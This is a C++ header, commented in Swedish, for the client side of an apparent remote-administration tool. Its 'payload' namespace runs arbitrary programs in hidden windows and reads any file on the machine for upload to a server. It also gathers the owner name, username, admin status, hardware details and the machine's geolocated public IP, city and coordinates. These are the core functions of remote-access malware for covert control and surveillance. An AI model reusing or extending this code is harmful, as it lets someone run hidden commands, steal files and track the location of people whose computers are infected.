#pragma once
#include "precompile.h"
#include "process.h"
#include "directory.h"
#include "http_session.h"
#include "nlohmann/json.hpp"
#include <Shlobj.h>

namespace helper { // olika hj�lp funktioner till klienten
	std::pair<std::string, std::string> ArgSplit(std::string args, char delimit)
	{ // splitar en str�ng vid mellanslaget till en std::pair

		auto found = args.find_first_of(delimit); // f�rs�k hitta f�rsta separeringen

		if (found != std::string::npos) { // om lyckats
			return { args.substr(0, found), args.substr(found + 1) }; // splita vid separering
		}
		else { // annars retunera bara det sj�lvst�ende argumentet
			return { args, "" };
		}
	}
	std::string dequote(std::string input) {
		input.erase(std::remove(input.begin(), input.end(), '\"'), input.end());
		return input;
	}
}

namespace payload { // payload funktioner som anv�nds f�r att utf�ra n�gonting p� klienten tex starta en process ta reda p� vem som �r inloggad

	bool process_execution(std::string program, bool hide)
	{
		STARTUPINFOA info = { sizeof(info) };
		PROCESS_INFORMATION process_info;
		info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

		// om processen ska g�mmas s� g�m
		if (hide) {
			info.wShowWindow = SW_HIDE;
		}
		else {
			info.wShowWindow = SW_NORMAL;
		}
		//skapa process
		if (!CreateProcessA(0, (LPSTR)program.c_str(), 0, 0, false, CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE, 0, 0, &info, &process_info)) {
			return false;
		}
		else {
			// f�r att undvika handle l�cka
			CloseHandle(process_info.hProcess);
			CloseHandle(process_info.hThread);
			return true;
		}
	}

	// om processen ska skapas g�md
	std::string process_execution_hidden(std::string program)
	{
		if (!process_execution(program, true)) {
			return std::to_string(GetLastError());
		}
		else {
			return "SUCCESS";
		}
	}


	// om processen ska skapas visande
	std::string process_execution_show(std::string program)
	{
		if (!process_execution(program, false)) {
			return std::to_string(GetLastError());
		}
		else {
			return "SUCCESS";
		}
	}
	// om man vill ladda ner en fil fr�n klienten till servern
	std::string download_file(std::string program)
	{
		if (std::filesystem::exists(program) && !std::filesystem::is_directory(program) && std::filesystem::file_size(program) > 0) { // om filen exsiterar och inte �r en mapp
			std::ifstream file(program, std::ios::binary); // l�s in filen bin�rt
			return std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>()); // konvertera filen till en str�ng med itrator konstruktion
		}
		else {
			return "FAIL";
		}
	}

	inline std::string GetValue(HKEY root_key, std::string key_name, std::string value)
	{
		// Get Registry Size and Type
		unsigned long value_type{};
		unsigned long value_size{};


		LSTATUS ret = RegGetValueA(root_key, key_name.c_str(), value.c_str(), RRF_RT_ANY | RRF_SUBKEY_WOW6464KEY, &value_type, NULL, &value_size);
		if (!ret) {

			switch (value_type) {
				case REG_DWORD:
				{
					DWORD buffer;
					if (!RegGetValueA(root_key, key_name.c_str(), value.c_str(), RRF_RT_ANY | RRF_SUBKEY_WOW6464KEY, &value_type, &buffer, &value_size)) {
						return std::to_string(buffer);
					}
				}
				case REG_SZ:
				case REG_MULTI_SZ:
				case REG_EXPAND_SZ:
				{
					std::vector<unsigned char> buffer(value_size, '\0');
					if (!RegGetValueA(root_key, key_name.c_str(), value.c_str(), RRF_RT_ANY | RRF_SUBKEY_WOW6464KEY, &value_type, buffer.data(), &value_size)) {
						buffer.resize(value_size);
						return (buffer[0] != '\0') ? std::string(buffer.begin(), buffer.end()) : "null";
					}
				}
				default:
					break;
			}
		}
		else {
			//std::cout << "Error: The System cannot find the registry entry!" << std::endl;
			return "";
		}

		return std::to_string(ret);

	}

	std::string info(std::string query)
	{
		http_session geoip("Remote-Admin-Web 1/0", "api.ipdata.co");
		nlohmann::json response;
		bool success = false;
		while (!success) {
			try {
				response = nlohmann::json::parse(geoip.request("GET", "?api-key=test"));
				success = true;
			}
			catch (std::exception exc) { std::cout << "json-parse() - could not parse json, webstream broken" << std::endl; }
		}
		
		std::unordered_map<std::string, std::function<std::string()>> information = {
			{"Windows Product", [&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "productname"); } },
			{"Windows Owner",[&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOwner"); } },
			{"Windows Architecture",[&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", "PROCESSOR_ARCHITECTURE"); } },
			{"Computer Name",[&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", "ComputerName"); } },
			{"Cpu Name", [&] { return payload::GetValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString"); } },
			{"Ram Size",[&] {
				MEMORYSTATUSEX buffer{sizeof(buffer)};

				GlobalMemoryStatusEx(&buffer);

				return std::to_string(std::roundl(buffer.ullTotalPhys / (1024.0 * 1024.0 * 1024.0)));
			}},
			{"Windows Username", [&]{
				std::vector<char> buffer(256, '\0');
				DWORD size = 256;
				if (GetUserNameA(buffer.data(), &size)) {
					buffer.resize(size);
					return std::string(buffer.begin(), buffer.end()).substr(0, size-1);
				}
				else {
					return std::string("null");
				}
			}},
			{"Running As Admin", [&] { return std::string(IsUserAnAdmin() ? "true" : "false"); }},
			{"Public Ip",[&] { return helper::dequote(response["ip"].dump()); } },
			{"Continent",[&] { return helper::dequote(response["continent_name"].dump()); } },
			{"Country",[&] { return helper::dequote(response["country_name"].dump()); } },
			{"Region", [&] { return helper::dequote(response["region"].dump()); } },
			{"City", [&] { return helper::dequote(response["city"].dump()); } },
			{"Latitude",[&] { return helper::dequote(response["latitude"].dump()); } },
			{"Longitude",[&] { return helper::dequote(response["longitude"].dump()); } },
			{"Language",[&] { return helper::dequote(response["languages"].dump()); } }
		};

		if (information.count(query)) {
			return information[query]();
		}
		else {
			return "NOENTRY";
		}
	}
}

